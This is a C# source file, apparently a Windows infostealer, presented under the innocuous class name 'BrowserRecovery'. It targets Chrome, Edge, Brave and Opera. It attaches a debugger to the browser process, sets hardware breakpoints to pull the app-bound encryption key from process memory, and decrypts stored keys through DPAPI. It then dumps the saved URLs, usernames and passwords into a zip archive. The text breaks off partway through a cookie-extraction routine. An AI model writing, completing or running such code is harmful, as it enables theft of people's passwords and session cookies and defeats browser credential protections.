using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Runtime.InteropServices;
using System.Text;
using System.Diagnostics;
using System.Linq;

namespace ConsoleApp1
{
    internal class BrowserRecovery
    {
        #region Win32 Structures

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFO
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public ushort wShowWindow;
            public ushort cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Explicit)]
        public struct DEBUG_EVENT
        {
            [FieldOffset(0)] public uint dwDebugEventCode;
            [FieldOffset(4)] public uint dwProcessId;
            [FieldOffset(8)] public uint dwThreadId;

            // Union starts at offset 16 for x64
            [FieldOffset(16)] public EXCEPTION_DEBUG_INFO Exception;
            [FieldOffset(16)] public CREATE_THREAD_DEBUG_INFO CreateThread;
            [FieldOffset(16)] public CREATE_PROCESS_DEBUG_INFO CreateProcessInfo;
            [FieldOffset(16)] public EXIT_THREAD_DEBUG_INFO ExitThread;
            [FieldOffset(16)] public EXIT_PROCESS_DEBUG_INFO ExitProcess;
            [FieldOffset(16)] public LOAD_DLL_DEBUG_INFO LoadDll;
            [FieldOffset(16)] public UNLOAD_DLL_DEBUG_INFO UnloadDll;
            [FieldOffset(16)] public OUTPUT_DEBUG_STRING_INFO DebugString;
            [FieldOffset(16)] public RIP_INFO RipInfo;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct EXCEPTION_DEBUG_INFO
        {
            public EXCEPTION_RECORD64 ExceptionRecord;
            public uint dwFirstChance;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct EXCEPTION_RECORD64
        {
            public uint ExceptionCode;
            public uint ExceptionFlags;
            public ulong ExceptionRecord;
            public ulong ExceptionAddress;
            public uint NumberParameters;
            public uint __unusedAlignment;
            public ulong ExceptionInformation0; public ulong ExceptionInformation1; public ulong ExceptionInformation2;
            public ulong ExceptionInformation3; public ulong ExceptionInformation4; public ulong ExceptionInformation5;
            public ulong ExceptionInformation6; public ulong ExceptionInformation7; public ulong ExceptionInformation8;
            public ulong ExceptionInformation9; public ulong ExceptionInformation10; public ulong ExceptionInformation11;
            public ulong ExceptionInformation12; public ulong ExceptionInformation13; public ulong ExceptionInformation14;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct LOAD_DLL_DEBUG_INFO
        {
            public IntPtr hFile;
            public IntPtr lpBaseOfDll;
            public uint dwDebugInfoFileOffset;
            public uint nDebugInfoSize;
            public IntPtr lpImageName;
            public ushort fUnicode;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct CREATE_THREAD_DEBUG_INFO
        {
            public IntPtr hThread;
            public IntPtr lpThreadLocalBase;
            public IntPtr lpStartAddress;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct CREATE_PROCESS_DEBUG_INFO
        {
            public IntPtr hFile;
            public IntPtr hProcess;
            public IntPtr hThread;
            public IntPtr lpBaseOfImage;
            public uint dwDebugInfoFileOffset;
            public uint nDebugInfoSize;
            public IntPtr lpThreadLocalBase;
            public IntPtr lpStartAddress;
            public IntPtr lpImageName;
            public ushort fUnicode;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct EXIT_THREAD_DEBUG_INFO
        {
            public uint dwExitCode;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct EXIT_PROCESS_DEBUG_INFO
        {
            public uint dwExitCode;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct UNLOAD_DLL_DEBUG_INFO
        {
            public IntPtr lpBaseOfDll;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct OUTPUT_DEBUG_STRING_INFO
        {
            public IntPtr lpDebugStringData;
            public ushort fUnicode;
            public ushort nDebugStringLength;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct RIP_INFO
        {
            public uint dwError;
            public uint dwType;
        }

        [StructLayout(LayoutKind.Explicit)]
        public struct CONTEXT64
        {
            [FieldOffset(0)] public ulong P1Home;
            [FieldOffset(8)] public ulong P2Home;
            [FieldOffset(16)] public ulong P3Home;
            [FieldOffset(24)] public ulong P4Home;
            [FieldOffset(32)] public ulong P5Home;
            [FieldOffset(40)] public ulong P6Home;
            [FieldOffset(48)] public uint ContextFlags;
            [FieldOffset(52)] public uint MxCsr;
            [FieldOffset(56)] public ushort SegCs;
            [FieldOffset(58)] public ushort SegDs;
            [FieldOffset(60)] public ushort SegEs;
            [FieldOffset(62)] public ushort SegFs;
            [FieldOffset(64)] public ushort SegGs;
            [FieldOffset(66)] public ushort SegSs;
            [FieldOffset(68)] public uint EFlags;
            [FieldOffset(72)] public ulong Dr0;
            [FieldOffset(80)] public ulong Dr1;
            [FieldOffset(88)] public ulong Dr2;
            [FieldOffset(96)] public ulong Dr3;
            [FieldOffset(104)] public ulong Dr6;
            [FieldOffset(112)] public ulong Dr7;
            [FieldOffset(120)] public ulong Rax;
            [FieldOffset(128)] public ulong Rcx;
            [FieldOffset(136)] public ulong Rdx;
            [FieldOffset(144)] public ulong Rbx;
            [FieldOffset(152)] public ulong Rsp;
            [FieldOffset(160)] public ulong Rbp;
            [FieldOffset(168)] public ulong Rsi;
            [FieldOffset(176)] public ulong Rdi;
            [FieldOffset(184)] public ulong R8;
            [FieldOffset(192)] public ulong R9;
            [FieldOffset(200)] public ulong R10;
            [FieldOffset(208)] public ulong R11;
            [FieldOffset(216)] public ulong R12;
            [FieldOffset(224)] public ulong R13;
            [FieldOffset(232)] public ulong R14;
            [FieldOffset(240)] public ulong R15;
            [FieldOffset(248)] public ulong Rip;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct DATA_BLOB
        {
            public int cbData;
            public IntPtr pbData;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_DOS_HEADER
        {
            public ushort e_magic;
            public ushort e_cblp;
            public ushort e_cp;
            public ushort e_crlc;
            public ushort e_cparhdr;
            public ushort e_minalloc;
            public ushort e_maxalloc;
            public ushort e_ss;
            public ushort e_sp;
            public ushort e_csum;
            public ushort e_ip;
            public ushort e_cs;
            public ushort e_lfarlc;
            public ushort e_ovno;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
            public ushort[] e_res;
            public ushort e_oemid;
            public ushort e_oeminfo;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
            public ushort[] e_res2;
            public int e_lfanew;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_FILE_HEADER
        {
            public ushort Machine;
            public ushort NumberOfSections;
            public uint TimeDateStamp;
            public uint PointerToSymbolTable;
            public uint NumberOfSymbols;
            public ushort SizeOfOptionalHeader;
            public ushort Characteristics;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_DATA_DIRECTORY
        {
            public uint VirtualAddress;
            public uint Size;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_OPTIONAL_HEADER64
        {
            public ushort Magic;
            public byte MajorLinkerVersion;
            public byte MinorLinkerVersion;
            public uint SizeOfCode;
            public uint SizeOfInitializedData;
            public uint SizeOfUninitializedData;
            public uint AddressOfEntryPoint;
            public uint BaseOfCode;
            public ulong ImageBase;
            public uint SectionAlignment;
            public uint FileAlignment;
            public ushort MajorOperatingSystemVersion;
            public ushort MinorOperatingSystemVersion;
            public ushort MajorImageVersion;
            public ushort MinorImageVersion;
            public ushort MajorSubsystemVersion;
            public ushort MinorSubsystemVersion;
            public uint Win32VersionValue;
            public uint SizeOfImage;
            public uint SizeOfHeaders;
            public uint CheckSum;
            public ushort Subsystem;
            public ushort DllCharacteristics;
            public ulong SizeOfStackReserve;
            public ulong SizeOfStackCommit;
            public ulong SizeOfHeapReserve;
            public ulong SizeOfHeapCommit;
            public uint LoaderFlags;
            public uint NumberOfRvaAndSizes;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public IMAGE_DATA_DIRECTORY[] DataDirectory;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_NT_HEADERS64
        {
            public uint Signature;
            public IMAGE_FILE_HEADER FileHeader;
            public IMAGE_OPTIONAL_HEADER64 OptionalHeader;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_SECTION_HEADER
        {
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public byte[] Name;
            public uint VirtualSize;
            public uint VirtualAddress;
            public uint SizeOfRawData;
            public uint PointerToRawData;
            public uint PointerToRelocations;
            public uint PointerToLinenumbers;
            public ushort NumberOfRelocations;
            public ushort NumberOfLinenumbers;
            public uint Characteristics;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct THREADENTRY32
        {
            public uint dwSize;
            public uint cntUsage;
            public uint th32ThreadID;
            public uint th32OwnerProcessID;
            public int tpBasePri;
            public int tpDeltaPri;
            public uint dwFlags;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO : IDisposable
        {
            public int cbStruct;
            public int dwInfoVersion;
            public IntPtr pbNonce;
            public int cbNonce;
            public IntPtr pbAuthData;
            public int cbAuthData;
            public IntPtr pbTag;
            public int cbTag;
            public IntPtr pbMacContext;
            public int cbMacContext;
            public int cbAAD;
            public long cbData;
            public int dwFlags;

            public BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(byte[] iv, byte[] tag) : this()
            {
                dwInfoVersion = 1;
                cbStruct = Marshal.SizeOf(typeof(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO));
                if (iv != null) { cbNonce = iv.Length; pbNonce = Marshal.AllocHGlobal(cbNonce); Marshal.Copy(iv, 0, pbNonce, cbNonce); }
                if (tag != null) { cbTag = tag.Length; pbTag = Marshal.AllocHGlobal(cbTag); Marshal.Copy(tag, 0, pbTag, cbTag); }
            }

            public void Dispose() { if (pbNonce != IntPtr.Zero) Marshal.FreeHGlobal(pbNonce); if (pbTag != IntPtr.Zero) Marshal.FreeHGlobal(pbTag); }
        }

        #endregion

        #region Win32 P/Invokes

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CreateProcess(string lpApplicationName, StringBuilder lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WaitForDebugEvent(out DEBUG_EVENT lpDebugEvent, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ContinueDebugEvent(uint dwProcessId, uint dwThreadId, uint dwContinueStatus);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out int lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenThread(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint SuspendThread(IntPtr hThread);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint GetFinalPathNameByHandle(IntPtr hFile, [Out] StringBuilder lpszFilePath, uint cchFilePath, uint dwFlags);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool Thread32First(IntPtr hSnapshot, ref THREADENTRY32 lpte);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool Thread32Next(IntPtr hSnapshot, ref THREADENTRY32 lpte);

        [DllImport("crypt32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CryptUnprotectData(ref DATA_BLOB pDataIn, string ppszDataDescr, ref DATA_BLOB pOptionalEntropy, IntPtr pvReserved, IntPtr pPromptStruct, uint dwFlags, out DATA_BLOB pDataOut);

        [DllImport("kernel32.dll")]
        public static extern IntPtr LocalFree(IntPtr hMem);

        [DllImport("bcrypt.dll")]
        public static extern uint BCryptOpenAlgorithmProvider(out IntPtr phAlgorithm, string pszAlgId, string pszImplementation, uint dwFlags);

        [DllImport("bcrypt.dll")]
        public static extern uint BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, uint dwFlags);

        [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
        public static extern uint BCryptSetProperty(IntPtr hObject, string pszProperty, byte[] pbInput, int cbInput, uint dwFlags);

        [DllImport("bcrypt.dll")]
        public static extern uint BCryptGenerateSymmetricKey(IntPtr hAlgorithm, out IntPtr phKey, IntPtr pbKeyObject, int cbKeyObject, byte[] pbSecret, int cbSecret, uint dwFlags);

        [DllImport("bcrypt.dll")]
        public static extern uint BCryptDestroyKey(IntPtr hKey);

        [DllImport("bcrypt.dll")]
        public static extern uint BCryptDecrypt(IntPtr hKey, byte[] pbInput, int cbInput, ref BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo, byte[] pbIV, int cbIV, byte[] pbOutput, int cbOutput, out int pcbResult, uint dwFlags);

        [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
        public static extern int sqlite3_open(byte[] filename, out IntPtr ppDb);

        [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
        public static extern int sqlite3_close(IntPtr db);

        [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
        public static extern int sqlite3_prepare_v2(IntPtr db, byte[] zSql, int nByte, out IntPtr ppStmt, IntPtr pzTail);

        [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
        public static extern int sqlite3_step(IntPtr pStmt);

        [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
        public static extern int sqlite3_finalize(IntPtr pStmt);

        [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
        public static extern IntPtr sqlite3_column_text(IntPtr pStmt, int iCol);

        [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
        public static extern IntPtr sqlite3_column_blob(IntPtr pStmt, int iCol);

        [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
        public static extern int sqlite3_column_bytes(IntPtr pStmt, int iCol);

        [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
        public static extern int sqlite3_column_int(IntPtr pStmt, int iCol);

        #endregion

        #region Browser Config

        public struct BrowserConfig
        {
            public string Name;
            public string ProcessName;
            public string[] ExePaths;
            public string DllName;
            public string[] UserDataSubdir;
            public string OutputDir;
            public string TempPrefix;
            public bool UseR14;
            public bool UseRoaming;
            public bool HasAbe;
        }

        private static readonly List<BrowserConfig> Configs = new List<BrowserConfig>
        {
            new BrowserConfig { Name = "Google Chrome", ProcessName = "chrome.exe", ExePaths = new[] { @"C:\Program Files\Google\Chrome\Application\chrome.exe", @"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" }, DllName = "chrome.dll", UserDataSubdir = new[] { "Google", "Chrome", "User Data" }, OutputDir = "chrome", TempPrefix = "chrome_tmp", UseR14 = false, UseRoaming = false, HasAbe = true },
            new BrowserConfig { Name = "Microsoft Edge", ProcessName = "msedge.exe", ExePaths = new[] { @"C:\Program Files\Microsoft\Edge\Application\msedge.exe", @"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" }, DllName = "msedge.dll", UserDataSubdir = new[] { "Microsoft", "Edge", "User Data" }, OutputDir = "edge", TempPrefix = "edge_tmp", UseR14 = true, UseRoaming = false, HasAbe = true },
            new BrowserConfig { Name = "Brave", ProcessName = "brave.exe", ExePaths = new[] { @"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe", @"C:\Program Files (x86)\BraveSoftware\Brave-Browser\Application\brave.exe" }, DllName = "chrome.dll", UserDataSubdir = new[] { "BraveSoftware", "Brave-Browser", "User Data" }, OutputDir = "brave", TempPrefix = "brave_tmp", UseR14 = false, UseRoaming = false, HasAbe = true },
            new BrowserConfig { Name = "Opera Stable", ProcessName = "opera.exe", ExePaths = new[] { Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Programs\Opera\opera.exe"), @"C:\Program Files\Opera\launcher.exe", @"C:\Program Files (x86)\Opera\launcher.exe" }, DllName = "launcher_lib.dll", UserDataSubdir = new[] { "Opera Software", "Opera Stable" }, OutputDir = "opera", TempPrefix = "opera_tmp", UseR14 = false, UseRoaming = true, HasAbe = false },
            new BrowserConfig { Name = "Opera GX", ProcessName = "opera.exe", ExePaths = new[] { Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Programs\Opera GX\opera.exe"), @"C:\Program Files\Opera GX\launcher.exe", @"C:\Program Files (x86)\Opera GX\launcher.exe" }, DllName = "launcher_lib.dll", UserDataSubdir = new[] { "Opera Software", "Opera GX Stable" }, OutputDir = "operagx", TempPrefix = "operagx_tmp", UseR14 = false, UseRoaming = true, HasAbe = false }
        };

        #endregion

        #region Helpers

        private static string ReadUtf8(IntPtr ptr)
        {
            if (ptr == IntPtr.Zero) return string.Empty;
            int len = 0; while (Marshal.ReadByte(ptr, len) != 0) len++;
            byte[] buffer = new byte[len]; Marshal.Copy(ptr, buffer, 0, len);
            return Encoding.UTF8.GetString(buffer);
        }

        private static void KillProcesses(string name)
        {
            try { foreach (var proc in Process.GetProcessesByName(Path.GetFileNameWithoutExtension(name))) proc.Kill(); } catch { }
        }

        public static byte[] DecryptDPAPI(byte[] data)
        {
            var dataIn = new DATA_BLOB { cbData = data.Length, pbData = Marshal.AllocHGlobal(data.Length) };
            Marshal.Copy(data, 0, dataIn.pbData, data.Length);
            var entropy = new DATA_BLOB();
            try { if (CryptUnprotectData(ref dataIn, null, ref entropy, IntPtr.Zero, IntPtr.Zero, 0, out var dataOut)) { byte[] result = new byte[dataOut.cbData]; Marshal.Copy(dataOut.pbData, result, 0, dataOut.cbData); LocalFree(dataOut.pbData); return result; } } catch { } finally { Marshal.FreeHGlobal(dataIn.pbData); }
            return null;
        }

        public static byte[] DecryptAESGCM(byte[] key, byte[] iv, byte[] tag, byte[] cipherText)
        {
            IntPtr hAlg = IntPtr.Zero, hKey = IntPtr.Zero;
            try
            {
                if (BCryptOpenAlgorithmProvider(out hAlg, "AES", null, 0) != 0) return null;
                byte[] mode = Encoding.Unicode.GetBytes("ChainingModeGCM\0");
                if (BCryptSetProperty(hAlg, "ChainingMode", mode, mode.Length, 0) != 0) return null;
                if (BCryptGenerateSymmetricKey(hAlg, out hKey, IntPtr.Zero, 0, key, key.Length, 0) != 0) return null;
                using (var authInfo = new BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(iv, tag))
                {
                    byte[] plainText = new byte[cipherText.Length];
                    if (BCryptDecrypt(hKey, cipherText, cipherText.Length, ref authInfo, iv, iv.Length, plainText, plainText.Length, out int cbResult, 0) == 0) return plainText;
                }
            } catch { } finally { if (hKey != IntPtr.Zero) BCryptDestroyKey(hKey); if (hAlg != IntPtr.Zero) BCryptCloseAlgorithmProvider(hAlg, 0); }
            return null;
        }

        private static byte[] ReadProcessMemory(IntPtr hProcess, IntPtr address, int size)
        {
            byte[] buffer = new byte[size];
            if (ReadProcessMemory(hProcess, address, buffer, size, out int bytesRead)) { if (bytesRead != size) Array.Resize(ref buffer, bytesRead); return buffer; }
            return null;
        }

        private static List<uint> GetProcessThreads(uint pid)
        {
            var threads = new List<uint>();
            IntPtr snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
            if (snapshot != IntPtr.Zero) { var te = new THREADENTRY32 { dwSize = (uint)Marshal.SizeOf(typeof(THREADENTRY32)) }; if (Thread32First(snapshot, ref te)) do { if (te.th32OwnerProcessID == pid) threads.Add(te.th32ThreadID); } while (Thread32Next(snapshot, ref te)); CloseHandle(snapshot); }
            return threads;
        }

        private static void SetHardwareBreakpoint(uint threadId, IntPtr address)
        {
            IntPtr hThread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, false, threadId);
            if (hThread != IntPtr.Zero) { SuspendThread(hThread); var ctx = new CONTEXT64 { ContextFlags = CONTEXT_DEBUG_REGISTERS }; if (GetThreadContext(hThread, ref ctx)) { ctx.Dr0 = (ulong)address.ToInt64(); ctx.Dr7 = (ctx.Dr7 & ~0b11UL) | 0b01UL; SetThreadContext(hThread, ref ctx); } ResumeThread(hThread); CloseHandle(hThread); }
        }

        private static void ClearHardwareBreakpoints(uint pid)
        {
            foreach (var tid in GetProcessThreads(pid)) {
                IntPtr hThread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, false, tid);
                if (hThread != IntPtr.Zero) { SuspendThread(hThread); var ctx = new CONTEXT64 { ContextFlags = CONTEXT_DEBUG_REGISTERS }; if (GetThreadContext(hThread, ref ctx)) { ctx.Dr0 = 0; ctx.Dr7 &= ~0b11UL; SetThreadContext(hThread, ref ctx); } ResumeThread(hThread); CloseHandle(hThread); }
            }
        }

        private static void SetResumeFlag(uint threadId)
        {
            IntPtr hThread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, false, threadId);
            if (hThread != IntPtr.Zero) { SuspendThread(hThread); var ctx = new CONTEXT64 { ContextFlags = CONTEXT_CONTROL }; if (GetThreadContext(hThread, ref ctx)) { ctx.EFlags |= 0x10000; SetThreadContext(hThread, ref ctx); } ResumeThread(hThread); CloseHandle(hThread); }
        }

        private static byte[] GetV10Key(string userDataDir)
        {
            try {
                string localStatePath = Path.Combine(userDataDir, "Local State"); if (!File.Exists(localStatePath)) return null;
                string content = File.ReadAllText(localStatePath);
                if (content.Contains("\"encrypted_key\":\"")) {
                    string base64Key = content.Split(new[] { "\"encrypted_key\":\"" }, StringSplitOptions.None)[1].Split('"')[0];
                    byte[] encKey = Convert.FromBase64String(base64Key), key = new byte[encKey.Length - 5]; Array.Copy(encKey, 5, key, 0, key.Length);
                    return DecryptDPAPI(key);
                }
            } catch { } return null;
        }

        private static IntPtr FindTargetAddress(IntPtr hProcess, IntPtr dllBase, string browserName)
        {
            byte[] dos = ReadProcessMemory(hProcess, dllBase, Marshal.SizeOf(typeof(IMAGE_DOS_HEADER))); if (dos == null) return IntPtr.Zero;
            GCHandle h = GCHandle.Alloc(dos, GCHandleType.Pinned); IMAGE_DOS_HEADER dosH = (IMAGE_DOS_HEADER)Marshal.PtrToStructure(h.AddrOfPinnedObject(), typeof(IMAGE_DOS_HEADER)); h.Free();
            IntPtr ntPtr = dllBase + dosH.e_lfanew; byte[] nt = ReadProcessMemory(hProcess, ntPtr, Marshal.SizeOf(typeof(IMAGE_NT_HEADERS64))); if (nt == null) return IntPtr.Zero;
            h = GCHandle.Alloc(nt, GCHandleType.Pinned); IMAGE_NT_HEADERS64 ntH = (IMAGE_NT_HEADERS64)Marshal.PtrToStructure(h.AddrOfPinnedObject(), typeof(IMAGE_NT_HEADERS64)); h.Free();
            int count = ntH.FileHeader.NumberOfSections; byte[] secB = ReadProcessMemory(hProcess, ntPtr + Marshal.SizeOf(typeof(IMAGE_NT_HEADERS64)), Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER)) * count);
            var secs = new List<IMAGE_SECTION_HEADER>(); for (int i = 0; i < count; i++) { h = GCHandle.Alloc(secB, GCHandleType.Pinned); secs.Add((IMAGE_SECTION_HEADER)Marshal.PtrToStructure(h.AddrOfPinnedObject() + (i * Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER))), typeof(IMAGE_SECTION_HEADER))); h.Free(); }
            byte[] target = Encoding.ASCII.GetBytes("OSCrypt.AppBoundProvider.Decrypt.ResultCode"); IntPtr stringVa = IntPtr.Zero;
            foreach (var s in secs) { if (Encoding.ASCII.GetString(s.Name).TrimEnd('\0') == ".rdata") { byte[] data = ReadProcessMemory(hProcess, dllBase + (int)s.VirtualAddress, (int)s.VirtualSize); int pos = FindSubsequence(data, target); if (pos != -1) { stringVa = dllBase + (int)s.VirtualAddress + pos; break; } } }
            if (stringVa == IntPtr.Zero) return IntPtr.Zero;
            foreach (var s in secs) { if (Encoding.ASCII.GetString(s.Name).TrimEnd('\0') == ".text") { byte[] data = ReadProcessMemory(hProcess, dllBase + (int)s.VirtualAddress, (int)s.VirtualSize); for (int i = 0; i < data.Length - 7; i++) if (data[i] == 0x48 && data[i + 1] == 0x8D && data[i + 2] == 0x0D) { int off = BitConverter.ToInt32(data, i + 3); if (dllBase + (int)s.VirtualAddress + i + 7 + off == stringVa) return dllBase + (int)s.VirtualAddress + i; } } }
            return IntPtr.Zero;
        }

        private static int FindSubsequence(byte[] haystack, byte[] needle) { for (int i = 0; i <= haystack.Length - needle.Length; i++) { bool match = true; for (int j = 0; j < needle.Length; j++) if (haystack[i + j] != needle[j]) { match = false; break; } if (match) return i; } return -1; }

        private static byte[] ExtractKey(uint threadId, IntPtr hProcess, BrowserConfig config)
        {
            IntPtr hThread = OpenThread(THREAD_GET_CONTEXT, false, threadId); if (hThread == IntPtr.Zero) return null;
            var ctx = new CONTEXT64 { ContextFlags = CONTEXT_FULL };
            if (GetThreadContext(hThread, ref ctx)) {
                ulong[] keyPtrs = config.UseR14 ? new[] { ctx.R14, ctx.R15 } : new[] { ctx.R15, ctx.R14 };
                foreach (var ptr in keyPtrs) { if (ptr == 0) continue; byte[] buf = ReadProcessMemory(hProcess, (IntPtr)ptr, 32); if (buf != null) { IntPtr dataPtr = (IntPtr)ptr; if (BitConverter.ToUInt64(buf, 8) == 32) dataPtr = (IntPtr)BitConverter.ToUInt64(buf, 0); byte[] key = ReadProcessMemory(hProcess, dataPtr, 32); if (key != null && key.Any(b => b != 0)) { CloseHandle(hThread); return key; } } }
            } CloseHandle(hThread); return null;
        }

        private static byte[] DecryptBlob(byte[] blob, byte[] v10Key, byte[] v20Key, bool isOpera)
        {
            if (blob == null || blob.Length < 15) return null;
            string prefix = Encoding.ASCII.GetString(blob, 0, 3); byte[] key = (prefix == "v10" || prefix == "v11") ? (v10Key ?? v20Key) : (prefix == "v20" ? (v20Key ?? v10Key) : null);
            if (key != null) {
                byte[] iv = new byte[12], tag = new byte[16], cipher = new byte[blob.Length - 15 - 16]; Array.Copy(blob, 3, iv, 0, 12); Array.Copy(blob, 15, cipher, 0, cipher.Length); Array.Copy(blob, blob.Length - 16, tag, 0, 16);
                byte[] dec = DecryptAESGCM(key, iv, tag, cipher); if (dec != null) { if (prefix == "v20" || isOpera) { if (dec.Length <= 32) return dec; byte[] final = new byte[dec.Length - 32]; Array.Copy(dec, 32, final, 0, final.Length); return final; } return dec; }
            } else return DecryptDPAPI(blob);
            return null;
        }

        private static void ExtractPasswords(string profilePath, byte[] v10Key, byte[] v20Key, BrowserConfig config, ZipArchive archive)
        {
            string dbPath = Path.Combine(profilePath, "Login Data"); if (!File.Exists(dbPath)) return;
            string tempDb = Path.Combine(Path.GetTempPath(), config.TempPrefix + "_pass");
            try { File.Copy(dbPath, tempDb, true); if (sqlite3_open(Encoding.UTF8.GetBytes(tempDb + "\0"), out IntPtr db) == 0) {
                if (sqlite3_prepare_v2(db, Encoding.UTF8.GetBytes("SELECT origin_url, username_value, password_value FROM logins\0"), -1, out IntPtr stmt, IntPtr.Zero) == 0) {
                    var sb = new StringBuilder(); while (sqlite3_step(stmt) == 100) { byte[] b = new byte[sqlite3_column_bytes(stmt, 2)]; Marshal.Copy(sqlite3_column_blob(stmt, 2), b, 0, b.Length); byte[] dec = DecryptBlob(b, v10Key, v20Key, config.Name.Contains("Opera")); if (dec != null) sb.AppendLine($"URL: {ReadUtf8(sqlite3_column_text(stmt, 0))}\nUser: {ReadUtf8(sqlite3_column_text(stmt, 1))}\nPass: {Encoding.UTF8.GetString(dec)}\n---"); }
                    sqlite3_finalize(stmt); if (sb.Length > 0) using (var writer = new StreamWriter(archive.CreateEntry($"credentials/{config.OutputDir}/passwords.txt").Open())) writer.Write(sb.ToString());
                } sqlite3_close(db);
            } } catch { } finally { if (File.Exists(tempDb)) File.Delete(tempDb); }
        }

        private static void ExtractCookies(string profilePath, byte[] v10Key, byte[] v20Key, BrowserConfig config, ZipArchive archive)
        {
            string dbPath = Path.Combine(profilePath, "Network", "Cookies"); if (!File.Exists(dbPath)) dbPath = Path.Combine(profilePath, "Cookies"); if (!File.Exists(dbPath)) return;
            string tempDb = Path.Combine(Path.GetTempPath(), config.TempPrefix + "_cookies");
            try { File.Copy(dbPath, tempDb, true); if (sqlite3_open(Encoding.UTF8.GetBytes(tempDb + "\0"), out IntPtr db) == 0) {
